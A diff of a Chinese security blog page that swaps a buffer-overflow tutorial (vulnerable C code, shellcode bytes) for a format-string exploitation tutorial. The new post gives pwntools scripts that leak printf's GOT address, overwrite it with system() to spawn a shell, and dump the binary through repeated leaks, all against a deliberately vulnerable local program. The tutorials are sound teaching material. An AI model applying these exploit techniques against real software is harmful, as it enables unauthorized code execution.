@@ -6,24 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://niwbie.github.io">
-  <title>Linux下的缓冲区溢出攻击(一) | isee&#39;blog</title>
+  <title>格式化字符串漏洞的利用 | isee&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。">
+  <meta name="description" content="我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？这一节主要熟悉一下pwntools的使用。
+首先我们来看源程序：
+123456789101112#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;	char a[1024];		while(1)&amp;#123;		memset(a, &amp;apos">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux下的缓冲区溢出攻击(一)">
-<meta property="og:url" content="https://niwbie.github.io/2016/03/21/Linux下的缓冲区溢出攻击(一)/index.html">
+<meta property="og:title" content="格式化字符串漏洞的利用">
+<meta property="og:url" content="https://niwbie.github.io/2016/06/30/格式化字符串漏洞的利用/index.html">
 <meta property="og:site_name" content="isee'blog">
-<meta property="og:description" content="缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。">
-<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/1.png">
-<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/2.png">
-<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/3.png">
-<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/4.png">
-<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/5.png">
-<meta property="og:updated_time" content="2017-03-23T03:56:23.299Z">
+<meta property="og:description" content="我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？这一节主要熟悉一下pwntools的使用。
+首先我们来看源程序：
+123456789101112#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;	char a[1024];		while(1)&amp;#123;		memset(a, &amp;apos">
+<meta property="og:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/1.png">
+<meta property="og:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/2.png">
+<meta property="og:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/3.png">
+<meta property="og:updated_time" content="2017-03-23T03:59:11.988Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux下的缓冲区溢出攻击(一)">
-<meta name="twitter:description" content="缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。">
-<meta name="twitter:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/1.png">
+<meta name="twitter:title" content="格式化字符串漏洞的利用">
+<meta name="twitter:description" content="我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？这一节主要熟悉一下pwntools的使用。
+首先我们来看源程序：
+123456789101112#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;	char a[1024];		while(1)&amp;#123;		memset(a, &amp;apos">
+<meta name="twitter:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/1.png">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -139,7 +143,7 @@
 </nav>
 
       <div class="body-wrap">
-        <article id="post-Linux下的缓冲区溢出攻击(一)" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-格式化字符串漏洞的利用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -149,7 +153,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Linux下的缓冲区溢出攻击(一)
+      格式化字符串漏洞的利用
     </h1>
   
       
@@ -157,35 +161,32 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。</p>
-<a id="more"></a>
-<p>这里给出一个Linux下的32位程序的缓冲区溢出，顺便熟悉一下Linux程序的逆向分析，gdb调试、pwntools以及shellcode的编写等等。相对于Windows操作系统下OD调试工具的人性化，gdb调试工具用起来实在是。。。</p>
-<p>漏洞程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int vuln()&#123;</div><div class="line">	char buf[80];</div><div class="line">	int r;</div><div class="line">	r = read(0, buf, 400);</div><div class="line">	printf(&quot;Read %d bytes. buf is %s \n&quot;, r, buf);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)&#123;</div><div class="line">	vuln();</div><div class="line">	return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这里编译时关闭所有的保护机制（关于保护机制的绕过后面再来）<br>Gcc -m32 -z exestack -fno-stack-protector overflow.c -o overflow -g</p>
-<p>程序中很明显是由于read函数读的字符串的大小超过了buf定义的80个字节，所以有可能造成缓冲区溢出破坏堆栈。直接上gdb调试：</p>
-<p>现在printf函数处下断点，然后随便输入一串字符，找到buf的地址：<br><img src="/image/Linux下的缓冲区溢出攻击/1.png" alt="这里写图片描述"></p>
-<p>上面看出buf的地址为 0xffffcfec<br>接着在开一下ret的地址是否是$ebp+4:<br><img src="/image/Linux下的缓冲区溢出攻击/2.png" alt="这里写图片描述"></p>
-<p>0x0804849d，从IDA看出的确是该函数下一个地址：<br><img src="/image/Linux下的缓冲区溢出攻击/3.png" alt="这里写图片描述"></p>
-<p>算出这两个地址相差96个字节，所以我们的思路就是：<br>将shellcode写入缓冲区buf（0xffffcfec），并在96个字节之后，构造输入为0xffffcfec覆盖ret地址，使这个函数结束时跳转到0xffffcfec执行我们的shellcode。</p>
-<p>这里我们的shellcode是为了获取shell。那么问题来了，如何编写shellcode？<br>这里我尝试使用pwntools的shellcraft.i386.linux.sh()，但是并没有成功。从代码来看，次函数利用断点0x80获取shell，但是并没有成功。。。。那么还是自己来写吧。</p>
-<p>其实很简单，直接写一个c程序:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char *argv)&#123;</div><div class="line">	char code[] = &quot;/bin/sh&quot;;</div><div class="line">	execv(code, NULL, NULL);</div><div class="line">	return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>编译后拖到IDA看：<br><img src="/image/Linux下的缓冲区溢出攻击/4.png" alt="这里写图片描述"></p>
-<p>所以得到shellcode：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Shellcode = &quot;\x55\x89\xe5\x83\xe4\xf0\x83\xec\x20\xc7\x44\x24\x18\x2f\x62\x69\x6e\xc7\x77\x24\x1c\x2f\x73\x68\x00\xc7\x44\x24\x08\x00\x00\x00\x00\xc7\x44\x24\x04\x00\x00\x00\x00\x00\x8d\x44\x24\x18\x89\x04\x24\x8e\xbe\xfe\xff\xff&quot;</div></pre></td></tr></table></figure></p>
-<p>这里加粗处应该根据JMP公式自己计算地址。<br>最终得到shell：<br><img src="/image/Linux下的缓冲区溢出攻击/5.png" alt="这里写图片描述"></p>
-<p>但是其实这里还有许多问题：</p>
-<ol>
-<li>由于最终的堆栈平衡没有做好，所以导致程序崩溃的问题没有解决。</li>
-<li>这是是实际调试的时候，获取到了堆栈的地址，我们才有办法用0xffffcfec去覆盖ret。那么实际运用中，这个堆栈的地址并不知道，该如何去获得呢？</li>
-<li>这里的execv是我们在调试过程中获得的，那么在无法调试的情况下，如何获取程序中任意函数的地址呢？</li>
-<li>由于是关闭了ALSR、NX等保护机制，那么如果开了这些保护机制该怎么办呢？</li>
-</ol>
-
+        <a id="more"></a>
+<p>我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？<br>这一节主要熟悉一下pwntools的使用。</p>
+<p>首先我们来看源程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char **argv)&#123;</div><div class="line">	char a[1024];	</div><div class="line">	while(1)&#123;</div><div class="line">		memset(a, &apos;\0&apos;, 1024);</div><div class="line">		read(0, a, 1024);</div><div class="line">		printf(a);</div><div class="line">		fflush(stdout);</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>gcc -m32 -fno-protector -O0 fmttest.c -o fmttest<br>程序编译时开启了栈保护。</p>
+<p>在这个程序中，我们为了实验方便，循环读取输入，然后使用printf输出。<br>很明显可以看出这里存在格式化字符串漏洞。那么为了写入shell，我们的思路是将printf函数的地址改成system函数的地址，这样当我们再次输入”/bin/sh”时，就可以获得shell了。</p>
+<p>先说一个知识点，就是格式化字符串中的”$”<br>一般情况下，如果我们的字符串为”%x”，就会将取1个参数，那么如果是”%3$x”，则是取出第三个参数。即利用”$”可以取出任意位置的参数。利用这点，可以做很多是，比如dump处程序的bin文件。</p>
+<p>当”$”取出的第N个参数刚好是该字符串的地址是，我们称N为offset。<br>比如当 N=4 时，我们可以构造这样一个payload： addr + “%4$s” ，那么printf就会打印出addr指向的内存的字符串，知道\0为止。这样就是所谓的内存泄露。比如我们利用这样特性， 将addr构造成print函数的地址（print_got）,那么我们就讲得到printf函数在程序中的地址了。</p>
+<p>所以在这题中，可以使用pwntools先获得offset：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;./fmttest&apos;)</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">	r = process(&apos;./fmttest&apos;)</div><div class="line">	r.sendline(payload)</div><div class="line">	info = r.recv()</div><div class="line">	r.close()</div><div class="line">	return info</div><div class="line">auto = FmtStr(exec_fmt)</div><div class="line">print auto.offset</div></pre></td></tr></table></figure>
+<p><img src="/image/格式化字符串漏洞的利用/1.png" alt="这里写图片描述"></p>
+<p>offset为4</p>
+<p>接着在IDA中找到printf的got地址为：0x804a010,然后获取printf函数的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">r = process(&apos;./fmttest&apos;)</div><div class="line"></div><div class="line">print_got = 0x804a010</div><div class="line">payload = p32(print_got) + &apos;%4$s&apos;</div><div class="line"></div><div class="line">r.send(payload)</div><div class="line">print_addr = u32(r.recv()[4:8]) #第一次收到后发现不止4个字节，截取有用的</div><div class="line">log.success(&quot;printf_address =&gt; &#123;&#125;&quot;.format(hex(print_addr)))</div></pre></td></tr></table></figure>
+<p><img src="/image/格式化字符串漏洞的利用/2.png" alt="这里写图片描述"></p>
+<p>根据给出的lib（假设是给了的）算出两者的偏移为0xd100，得出system的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">print_system_offset = 0xd100</div><div class="line">read_got = 0x804a00c</div><div class="line">system_addr = print_addr - print_system_offset</div><div class="line"></div><div class="line">log.success(&quot;system =&gt; &#123;&#125;&quot;.format(hex(system_addr)))</div><div class="line">payload = fmtstr_payload(4, &#123;print_got : 0xf7e46310&#125;)</div><div class="line">r.send(payload)</div><div class="line">r.send(&apos;/bin/sh&apos;)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>这样就获取到了shell：<br><img src="/image/格式化字符串漏洞的利用/3.png" alt="这里写图片描述"></p>
+<p>同时，这样的内存泄露也可以用于dump处bin文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">f = open(&apos;source&apos;, &apos;ab+&apos;)</div><div class="line"></div><div class="line">begin = 0x8048000</div><div class="line">offset = 0</div><div class="line"></div><div class="line">while True:</div><div class="line">	addr = begin + offset</div><div class="line">	p = process(&apos;./fmttest&apos;)</div><div class="line">	p.sendline(&quot;%6$saaaa&quot; + p32(addr))</div><div class="line"></div><div class="line">	try:</div><div class="line">		info = p.recvuntil(&apos;aaaa&apos;)[-4]</div><div class="line">	except EOFError:</div><div class="line">		print offset </div><div class="line">		break</div><div class="line"></div><div class="line">	info += &apos;\x00&apos;</div><div class="line">	p.close()</div><div class="line">	offset += len(info)</div><div class="line">	f.write(info)</div><div class="line">	f.flush()</div><div class="line"></div><div class="line">f.close()</div></pre></td></tr></table></figure>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/03/21/Linux下的缓冲区溢出攻击(一)/" class="archive-article-date">
-  	<time datetime="2016-03-21T05:06:48.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-21</time>
+      <a href="/2016/06/30/格式化字符串漏洞的利用/" class="archive-article-date">
+  	<time datetime="2016-06-30T03:54:32.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-06-30</time>
 </a>
       
 	<div class="article-tag tagcloud">
@@ -203,18 +204,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/03/21/Linux下的缓冲区溢出攻击(二)/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/07/15/一个简单的QQ盗号木马分析/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Linux下的缓冲区溢出攻击(二)
+          一个简单的QQ盗号木马分析
         
       </div>
     </a>
   
   
-    <a href="/2016/03/17/文件补丁/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">文件补丁</div>
+    <a href="/2016/06/23/漏洞挖掘基础之格式化字符串/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">漏洞挖掘基础之格式化字符串</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -248,7 +249,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="Linux下的缓冲区溢出攻击(一)" data-title="Linux下的缓冲区溢出攻击(一)" data-url="https://niwbie.github.io/2016/03/21/Linux下的缓冲区溢出攻击(一)/"></div>
+	<div class="ds-thread" data-thread-key="格式化字符串漏洞的利用" data-title="格式化字符串漏洞的利用" data-url="https://niwbie.github.io/2016/06/30/格式化字符串漏洞的利用/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
